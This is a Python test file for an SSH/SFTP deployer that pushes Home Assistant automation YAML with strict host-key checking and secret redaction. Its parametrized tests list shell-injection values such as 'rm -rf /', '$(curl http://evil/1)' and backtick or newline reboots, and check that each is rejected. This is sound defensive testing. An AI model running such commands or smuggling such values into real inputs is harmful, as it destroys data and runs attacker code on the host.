# AI-assisted development — firmware, HA automation, config generator and docs were created with AI (LLM) help, reviewed and tested by the author. Provided as-is, without warranty; verify on your own hardware, don't use for safety-critical applications.
"""Tests for strict-host-key SSH/SFTP deployment and the secret-free deploy script."""

from __future__ import annotations

import os
import shlex
from dataclasses import dataclass

import pytest

from micropad.constants import AI_NOTICE
from micropad.models import Settings
from micropad.ssh_upload import (
    CompletedCommand,
    SSHDeployer,
    SSHUploadError,
    downloadable_ssh_script,
)


@dataclass(frozen=True)
class RunnerCall:
    argv: list[str]
    input_text: str | None


class RecordingRunner:
    """Capture exact command lines without running any real ssh/sftp/remote command."""

    def __init__(self, failure_index: int | None = None, stderr: str = "") -> None:
        self.failure_index = failure_index
        self.stderr = stderr
        self.calls: list[RunnerCall] = []

    def run(self, argv: list[str], input_text: str | None = None) -> CompletedCommand:
        index = len(self.calls)
        self.calls.append(RunnerCall(list(argv), input_text))
        return CompletedCommand(1 if index == self.failure_index else 0, "", self.stderr)


def valid_settings() -> Settings:
    return Settings(
        ssh_host="ha.local",
        ssh_port=2222,
        ssh_user="deploy",
        ssh_key="/safe/id_ed25519",
        ssh_known_hosts="/safe/known_hosts",
        remote_path="/config/automations/micropad.yaml",
        ssh_reload_strategy="core_restart",
    )


def test_deploy_uses_strict_host_key_sftp_temp_and_atomic_move() -> None:
    runner = RecordingRunner()
    settings = valid_settings()
    temporary = SSHDeployer(settings, runner=runner).deploy("id: micropad_controller\n")
    common = [
        "-i",
        "/safe/id_ed25519",
        "-o",
        "BatchMode=yes",
        "-o",
        "StrictHostKeyChecking=yes",
        "-o",
        "UserKnownHostsFile=/safe/known_hosts",
    ]
    assert runner.calls[0].argv == ["sftp", "-P", "2222", *common, "deploy@ha.local"]
    assert "put " in runner.calls[0].input_text
    assert temporary.startswith("/config/automations/.micropad.yaml.")
    ssh_base = ["ssh", "-p", "2222", *common, "deploy@ha.local"]
    # Remote commands are delivered as one argv element with shlex-safe quoting; a
    # plain path carries no quotes while a path with special characters is quoted.
    assert runner.calls[1].argv == [*ssh_base, f"test -s {shlex.quote(temporary)}"]
    assert runner.calls[2].argv == [
        *ssh_base,
        f"mv -f -- {shlex.quote(temporary)} {shlex.quote('/config/automations/micropad.yaml')}",
    ]
    assert runner.calls[3].argv == [*ssh_base, "ha core restart"]


def test_sftp_and_ssh_use_explicit_argv_with_no_shell_string() -> None:
    runner = RecordingRunner()
    SSHDeployer(valid_settings(), runner=runner).deploy("id: micropad_controller\n")
    for call in runner.calls:
        assert isinstance(call.argv, list)
        assert all(isinstance(argument, str) for argument in call.argv)
        # The sftp batch is a single put operation supplied as stdin text, never an argv element.
        assert call.input_text is None or call.input_text.startswith("put ")


def test_remote_path_with_spaces_is_shell_quoted_for_the_remote_shell() -> None:
    settings = valid_settings().model_copy(
        update={"remote_path": "/config/dir with space/micropad.yaml"}
    )
    runner = RecordingRunner()
    SSHDeployer(settings, runner=runner).deploy("id: micropad_controller\n")
    move_command = runner.calls[2].argv[-1]
    assert "'/config/dir with space/micropad.yaml'" in move_command
    assert move_command.count("'") >= 4


def test_success_places_reload_last_and_returns_the_remote_temp_path() -> None:
    runner = RecordingRunner()
    returned = SSHDeployer(valid_settings(), runner=runner).deploy("id: micropad_controller\n")
    assert len(runner.calls) == 4
    assert runner.calls[3].argv[-1] == "ha core restart"
    assert returned == shlex.split(runner.calls[2].argv[-1])[3]


def test_missing_connection_fields_rejected_before_any_command() -> None:
    runner = RecordingRunner()
    for field in ("ssh_host", "ssh_user", "ssh_key"):
        settings = valid_settings().model_copy(update={field: ""})
        with pytest.raises(SSHUploadError, match="required"):
            SSHDeployer(settings, runner=runner)
    assert runner.calls == []


def test_non_absolute_remote_path_rejected_before_any_command() -> None:
    settings = valid_settings().model_copy(
        update={"remote_path": "config/automations/micropad.yaml"}
    )
    with pytest.raises(SSHUploadError, match="absolute"):
        SSHDeployer(settings, RecordingRunner())


def test_free_form_remote_commands_are_not_autoccepted_by_the_model() -> None:
    """The API model no longer carries free-form remote commands (P0.2)."""
    settings = Settings(
        ssh_host="ha.local", ssh_user="deploy", ssh_key="/safe/id_ed25519"
    )
    assert "ssh_validate_command" not in settings.model_dump()
    assert "ssh_reload_command" not in settings.model_dump()
    assert settings.ssh_reload_strategy in {"none", "core_restart"}


@pytest.mark.parametrize(
    "payload",
    [
        {"ssh_reload_strategy": "id > /tmp/pwned"},
        {"ssh_reload_strategy": "ha core restart; rm -rf /"},
        {"ssh_reload_strategy": "$(curl http://evil/1)"},
        {"ssh_reload_strategy": "core_restart && reboot"},
        {"ssh_reload_strategy": "reboot\nreboot"},
        {"ssh_reload_strategy": "`reboot`"},
    ],
)
def test_arbitrary_reload_strategy_values_are_rejected(store, payload) -> None:
    """Only the fixed strategy enum values survive model validation."""
    from micropad.models import parse_config

    base = store.load().model_dump(mode="json", by_alias=True)
    base["settings"].update(payload)
    with pytest.raises(ValueError):
        parse_config(base)


@pytest.mark.parametrize(
    "bad_path",
    [
        "/config/automations/; rm -rf /",
        "/config/automations/x && id > /tmp/pwned",
        "/config/automations/$(curl http://evil)",
        "/config/automations/x\nreboot",
        "/config/automations/`reboot`",
        "/config/automations/|shutdown",
        "/config/automations/x & reboot",
        "/config/automations/x*",
        "/config/automations/x?",
        "/config/automations/x$USER",
        "/config/automations/x;",
        "/config/automations/x&",
        "/config/automations/x|",
        "/config/automations/x>",
        "/config/automations/x<",
    ],
)
def test_injection_remote_paths_are_rejected_before_any_command(bad_path: str) -> None:
    settings = valid_settings().model_copy(update={"remote_path": bad_path})
    with pytest.raises(SSHUploadError):
        SSHDeployer(settings, RecordingRunner())


@pytest.mark.parametrize(
    "bad_key",
    [
        "/config/x; id > /tmp/pwned",
        "/config/x$(reboot)",
        "/config/x\nreboot",
        "/config/x`reboot`",
        "/config/x | shutdown",
    ],
)
def test_injection_ssh_key_paths_are_rejected(bad_key: str) -> None:
    settings = valid_settings().model_copy(update={"ssh_key": bad_key})
    with pytest.raises(SSHUploadError):
        SSHDeployer(settings, RecordingRunner())


def test_reload_none_skips_the_reload_command() -> None:
    runner = RecordingRunner()
    settings = valid_settings().model_copy(update={"ssh_reload_strategy": "none"})
    SSHDeployer(settings, runner=runner).deploy("id: micropad_controller\n")
    # upload + validation + atomic move only; no reload ssh call.
    assert len(runner.calls) == 3
    assert all("ha core restart" not in call.argv[-1] for call in runner.calls)


def test_reload_core_restart_uses_the_fixed_command() -> None:
    runner = RecordingRunner()
    settings = valid_settings().model_copy(update={"ssh_reload_strategy": "core_restart"})
    SSHDeployer(settings, runner=runner).deploy("id: micropad_controller\n")
    assert runner.calls[3].argv[-1] == "ha core restart"


def test_unknown_reload_strategy_rejected_before_any_command() -> None:
    # model_copy bypasses the pydantic enum, so the deployer's own guard must reject it.
    settings = valid_settings().model_copy(update={"ssh_reload_strategy": "pwned"})
    with pytest.raises(SSHUploadError, match="strategy"):
        SSHDeployer(settings, RecordingRunner())


@pytest.mark.parametrize(
    "field", ["ssh_host", "ssh_user", "ssh_key", "remote_path", "ssh_known_hosts"]
)
def test_placeholder_values_rejected_before_any_command(field: str) -> None:
    settings = valid_settings().model_copy(update={field: "your_key_here"})
    with pytest.raises(SSHUploadError, match="placeholder"):
        SSHDeployer(settings, RecordingRunner())


def test_invalid_port_rejected_before_any_command() -> None:
    # model_copy bypasses the pydantic range check, so the deployer's own guard must catch it.
    settings = valid_settings().model_copy(update={"ssh_port": 0})
    with pytest.raises(SSHUploadError, match="port"):
        SSHDeployer(settings, RecordingRunner())


@pytest.mark.parametrize(
    ("failure_index", "operation"),
    [(0, "upload"), (1, "validation"), (2, "atomic replacement"), (3, "reload")],
)
def test_failure_is_redacted_and_cleanup_is_bounded(failure_index: int, operation: str) -> None:
    runner = RecordingRunner(failure_index=failure_index, stderr="private-key-material top-secret")
    with pytest.raises(SSHUploadError, match=operation) as captured:
        SSHDeployer(valid_settings(), runner).deploy("id: micropad_controller\n")
    assert "private-key-material" not in str(captured.value)
    assert "top-secret" not in str(captured.value)
    cleanup = [call for call in runner.calls if "rm -f --" in call.argv[-1]]
    # Remote temp is removed only after SFTP succeeded and while the update is still in flight.
    if failure_index in (1, 2):
        assert cleanup
    else:
        assert not cleanup


def test_validation_failure_prevents_any_rename() -> None:
    runner = RecordingRunner(failure_index=1)
    with pytest.raises(SSHUploadError, match="validation"):
        SSHDeployer(valid_settings(), runner).deploy("id: micropad_controller\n")
    assert all("mv -f --" not in call.argv[-1] for call in runner.calls)


def test_upload_failure_issues_only_the_sftp_call() -> None:
    runner = RecordingRunner(failure_index=0)
    with pytest.raises(SSHUploadError, match="upload"):
        SSHDeployer(valid_settings(), runner).deploy("id: micropad_controller\n")
    assert len(runner.calls) == 1
    assert runner.calls[0].argv[0] == "sftp"


def test_local_temp_file_is_removed_after_failure() -> None:
    runner = RecordingRunner(failure_index=2)
    with pytest.raises(SSHUploadError, match="atomic replacement"):
        SSHDeployer(valid_settings(), runner).deploy("id: micropad_controller\n")
    put_parts = (runner.calls[0].input_text or "").split()
    assert put_parts[0] == "put"
    local_path = put_parts[1]
    assert not os.path.exists(local_path)


def test_download_script_never_contains_configured_key_or_token() -> None:
    settings = Settings(
        ssh_host="ha.local",
        ssh_user="deploy",
        ssh_key="/private/id",
        ha_token="top-" + "secret",
    )
    script = downloadable_ssh_script(settings)
    assert "/private/id" not in script
    assert "top-secret" not in script
    assert "${SSH_KEY:?Set SSH_KEY}" in script


def test_download_script_instructs_operator_to_supply_credentials_and_content() -> None:
    script = downloadable_ssh_script(valid_settings())
    assert "#!/usr/bin/env bash" in script
    assert "set -euo pipefail" in script
    assert "${SSH_KEY:?Set SSH_KEY}" in script
    assert "${AUTOMATION_YAML:?Set AUTOMATION_YAML}" in script
    assert "deploy@ha.local" in script


def test_download_script_carries_the_ai_notice() -> None:
    script = downloadable_ssh_script(valid_settings())
    assert AI_NOTICE in script
